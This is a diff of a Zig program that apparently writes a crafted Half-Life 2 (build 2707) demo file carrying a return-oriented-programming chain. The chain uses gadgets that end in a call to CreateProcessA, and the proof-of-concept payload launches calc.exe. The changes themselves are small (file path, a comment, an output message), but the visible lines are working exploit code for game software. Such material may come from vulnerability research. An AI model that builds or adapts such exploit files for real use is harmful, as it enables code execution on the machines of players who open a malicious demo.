@@ -4,7 +4,7 @@ const std = @import("std");
 
 // Demo protocol 2
 // Network protocol 7
-const base_demo = @embedFile("test.dem");
+const base_demo = @embedFile("demos/hl2-2707.dem");
 
 const payload = "C:/Windows/System32/calc.exe";
 
@@ -156,7 +156,7 @@ pub fn main() !void {
     try cmd_writer.writeInt(u32, tickcount - offset_vt_PreDataUpdate, .little);
     try cmd_writer.writeInt(u32, 0xffffffff, .little);
     try cmd_writer.writeInt(u32, pop_edi_gadget, .little); // pop edi
-    try cmd_writer.writeInt(u32, 0xffffffff, .little); // ret 4
+    try cmd_writer.writeInt(u32, 0xffffffff, .little); // skipped: ret 4
     try cmd_writer.writeInt(u32, sv_cheats, .little);
     try cmd_writer.writeInt(u32, deref_edi_20_gadget, .little); // mov ebx, dword ptr [edi + 0x20] (we added 0x20 here, no need to add m_pszString_offset)
     try cmd_writer.writeInt(u32, create_process_gadget, .little); // push ebx; call CreateProcessA
@@ -172,5 +172,5 @@ pub fn main() !void {
 
     _ = try writer.write(base_demo[base_demo.len - 5 .. base_demo.len]);
 
-    std.debug.print("Demo header written to out.dem\n", .{});
+    std.debug.print("Half-Life 2 (build 2707) demo written to out.dem\n", .{});
 }
